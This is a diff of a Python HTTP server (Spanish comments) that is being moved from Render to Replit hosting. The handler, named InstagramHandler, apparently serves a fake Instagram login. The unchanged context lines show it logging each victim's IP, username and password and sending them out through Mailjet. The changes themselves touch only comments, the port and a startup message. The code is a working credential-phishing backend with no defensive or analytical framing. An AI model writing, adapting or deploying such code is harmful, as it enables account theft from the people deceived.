@@ -1,4 +1,4 @@
-# server.py - versión para Render
+# server.py - versión para Replit
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import json
 from datetime import datetime
@@ -32,7 +32,7 @@ class InstagramHandler(BaseHTTPRequestHandler):
                 ip = self.client_address[0]
                 fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-                # Log local en consola Render
+                # Log local en consola Replit
                 print(f"📥 Login recibido -> [{fecha}] {ip} | Usuario: {username} | Contraseña: {password}")
 
                 # Enviar por Mailjet
@@ -95,7 +95,7 @@ Fecha: {fecha}
 
 # --- MAIN ---
 if __name__ == "__main__":
-    PORT = int(os.environ.get("PORT", 8080))
+    PORT = int(os.getenv("PORT", 8000))  # Replit asigna el puerto automáticamente
     server = HTTPServer(('0.0.0.0', PORT), InstagramHandler)
-    print(f"🚀 Servidor corriendo en puerto {PORT}")
+    print(f"✅ Servidor corriendo en http://localhost:{PORT}")
     server.serve_forever()
